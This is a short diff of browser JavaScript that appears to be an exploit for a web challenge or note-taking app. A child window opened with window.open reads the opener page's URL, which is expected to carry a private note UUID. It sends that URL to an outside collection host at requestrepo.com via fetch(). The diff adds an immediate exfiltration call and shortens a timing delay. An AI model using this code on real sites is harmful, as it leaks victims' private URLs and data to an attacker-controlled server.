@@ -6,6 +6,7 @@ if (window.location.hash == '#child') {
   // The child acts as the "puppet master"
   // The parent should now be on the previous page (with the note UUID in the URL param)
   console.log('sleeping');
+  fetch('https://ov4f10db.requestrepo.com/final?'+window.opener.location.href);
   sleep(1000).then(() => {
     fetch('https://ov4f10db.requestrepo.com/final?'+window.opener.location.href);
   });
@@ -14,7 +15,7 @@ if (window.location.hash == '#child') {
   window.open('/#child');
 
   // Go back to previous note page
-  sleep(500).then(() => {
+  sleep(300).then(() => {
     window.history.back();
   });
 };
